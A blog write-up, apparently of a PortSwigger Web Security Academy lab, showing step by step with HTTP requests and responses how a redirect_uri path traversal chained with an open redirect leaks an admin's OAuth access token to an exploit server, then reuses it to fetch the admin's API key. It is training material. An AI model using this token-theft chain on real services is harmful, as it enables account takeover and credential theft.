[Write Up]Lab: Stealing OAuth access tokens via an open redirect

2024-12-19
#write-up  #portswigger  #oauth 

Lab description#

Solution#

  1. 点击右上角My account

    GET /auth?client_id=gdhf6fwltqrgrrf9024ay&redirect_uri=https://0a7800fc0331631f823f21eb00500072.web-security-academy.net/oauth-callback&response_type=token&nonce=-321443983&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net

    HTTP/2 302 Found

Redirecting to <a href="/interaction/9vBHInlScXFwj3XcnV1xg">/interaction/9vBHInlScXFwj3XcnV1xg</a>.

    GET /interaction/9vBHInlScXFwj3XcnV1xg HTTP/2
Host: oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net

    HTTP/2 200 OK

  2. 使用wiener:peter登录，并且点击Continue，在对应的Response中出现apikey，且其Request使用Authorization进行鉴权

    GET /me HTTP/2
Host: oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net
Authorization: Bearer h1tx7R8XSBLKP6-fOv05F8Zl7mskjzNWtm1TDLg2f7X

    HTTP/2 200 OK

{
  "sub": "wiener",
  "apikey": "VRIUm4vS3kRD5yzDek15MQj6Ypi16A9r",
  "name": "Peter Wiener",
  "email": "wiener@hotdog.com",
  "email_verified": true
}

  3. 回放步骤1的/auth请求，尝试修改redirect_uri为https://www.google.com，获得以下错误

    GET /auth?client_id=gdhf6fwltqrgrrf9024ay&redirect_uri=https://www.google.com&response_type=token&nonce=-321443983&scope=openid%20profile%20email HTTP/2
Host: oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net

  4. 确认redirect_uri参数确实存在目录遍历攻击，尝试修改

    GET /auth?client_id=gdhf6fwltqrgrrf9024ay&redirect_uri=https://0a7800fc0331631f823f21eb00500072.web-security-academy.net/oauth-callback/../post?postId=1&response_type=token&nonce=-321443983&scope=openid%20profile%20email HTTP/2
Host: oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net

    HTTP/2 302 Found

Redirecting to <a href="/interaction/GBJNdgQYfIKP3EGdZddwM">/interaction/GBJNdgQYfIKP3EGdZddwM</a>

  5. 回到主页，随机点选一篇文章的View post，进入后点选最下方Next post，对应Request

    GET /post/next?path=/post?postId=2 HTTP/2
Host: 0a7800fc0331631f823f21eb00500072.web-security-academy.net

    HTTP/2 302 Found

  6. 将Next post的uri利用于目录遍历攻击处，点击最上方Go to exploit server，并在Body构造'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=321443983&scope=openid%20profile%20email' ![Exploit bdoy]](/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-3.jpg)

  7. 点击最下方的Store、Deliver expolit to victim后点击Access log

  8. 重放步骤2请求，并将Authorization: Bearer参数更换为Admin的access_token

    GET /me HTTP/2
Host: oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net
Authorization: Bearer GS-JMi8obX1Npl_w6ZM-gkPoCxtP7cpCtTJoK59wpIM

    HTTP/2 200 OK

{
  "sub": "administrator",
  "apikey": "kPXuqKXUqK5HW58clRNewxWr1q80vNdO",
  "name": "Administrator",
  "email": "administrator@normal-user.net",
  "email_verified": true
}

  9. 回到主页，点击最上方的Submit solution，并输入apikey内容即可解题
